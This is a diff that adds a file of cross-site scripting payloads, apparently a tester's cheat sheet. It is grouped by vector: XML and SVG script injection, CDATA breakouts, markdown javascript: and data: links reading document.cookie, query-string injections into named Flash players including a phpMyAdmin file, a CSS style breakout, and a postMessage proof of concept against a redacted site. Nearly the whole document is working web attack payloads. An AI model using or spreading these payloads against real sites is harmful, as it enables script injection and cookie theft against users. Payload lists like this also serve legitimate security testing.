@@ -1,0 +1,91 @@
+//xml
+<name>
+  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
+</name>
+
+//xml2
+<html>
+<head></head>
+<body>
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+</body>
+</html>
+
+//svg
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
+</svg>
+
+//svg short
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+
+//xss markdown
+[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
+
+//flash?
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
+swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
+swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
+plupload.flash.swf?%#target%g=alert&uid%g=XSS&
+moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\"));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
+bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
+flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
+phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
+
+//css
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+div  {
+    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+    background-color: #cccccc;
+}
+</style>
+</head>
+  <body>
+    <div>lol</div>
+  </body>
+</html>
+
+//post mesage
+<html>
+<body>
+    <input type=button value="Click Me" id="btn">
+</body>
+
+<script>
+document.getElementById('btn').onclick = function(e){
+    window.poc = window.open('http://www.redacted.com/#login');
+    setTimeout(function(){
+        window.poc.postMessage(
+            {
+                "sender": "accounts",
+                "url": "javascript:confirm('XSS')",
+            },
+            '*'
+        );
+    }, 2000);
+}
+</script>
+</html>
